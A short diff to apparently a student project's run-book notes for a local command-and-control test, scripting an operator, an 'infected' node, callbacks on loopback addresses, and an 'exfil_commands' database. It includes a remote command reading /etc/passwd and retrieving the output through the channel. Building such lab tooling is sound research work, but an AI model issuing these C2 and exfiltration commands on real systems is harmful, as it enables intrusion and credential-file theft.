@@ -1,8 +1,32 @@
+[UPDATE CLOUDFLARE!!!!]
+
 cd ~/Desktop/fyp/
 
 ./scripts/local/operator.sh
+[COPY GRAPH ID INTO INFECTED]
 ./scripts/local/infected-network.sh
 
-set callback 127.0.0.1:4447
-addpeer 127.0.0.42:4444
+set configdir /tmp/[RANDOMTEXT]
+[RESTART OPERATOR]
+
+set callback 127.0.0.1:4448
+addpeer 127.0.0.42:4445
+
 command echo hi
+
+set callback 127.0.1.6:4447
+command cat /etc/passwd
+retrieve 127.0.1.6:4447
+
+cd [CONFIGDIR]
+sqlite3 db.sqlite3
+select * from exfil_commands;
+
+echo '' | xxd -r -p
+
+cd ~/Desktop/fyp/
+cargo run --bin infected -- 127.9.8.7:9876
+
+pkill -9 -f -- "./target/debug/infected 127.0.0.42:4445"
+
+set callback 127.9.8.7:4447
